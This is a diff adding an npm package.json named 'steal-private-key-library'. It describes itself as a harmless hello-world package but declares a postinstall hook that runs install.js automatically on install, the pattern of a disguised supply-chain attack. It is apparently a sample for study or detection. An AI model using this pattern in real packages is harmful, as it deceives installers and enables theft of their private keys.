@@ -1,0 +1,11 @@
+{
+    "name": "steal-private-key-library",
+    "version": "1.0.0",
+    "description": "A simple package that exports execHello function to print Hello Everyone",
+    "main": "index.js",
+    "scripts": {
+        "postinstall": "node install.js"
+    },
+    "author": "",
+    "license": "MIT"
+}
